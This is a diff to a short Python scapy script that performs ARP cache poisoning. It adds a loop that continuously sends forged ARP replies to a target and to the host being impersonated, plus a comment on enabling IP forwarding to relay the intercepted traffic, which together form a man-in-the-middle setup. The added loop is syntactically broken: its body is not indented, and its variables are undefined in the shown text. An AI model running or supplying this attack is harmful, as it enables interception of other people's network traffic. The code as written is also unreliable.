@@ -1,4 +1,6 @@
 import scapy.all as scapy
+import time
+
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -17,4 +19,17 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
+
+total_packets_sent = 0
+try:
+    while True:
+    spoof(target_ip, spoof_ip)
+    spoof(spoof_ip, target_ip)
+    total_packets_sent += 2
+    print("\rPacketz sent:" + str(total_packets_sent), end="")
+    time.sleep(2)
+except KeyboardInterrupt:
+    print("...Quitting")
+
+#Ip forwarding run "echo 1 > /proc/sys/net/ipv4/ip_forward" in linux shell in order to forward flow of packets coming into your computer to the router and back into the poisoned computer
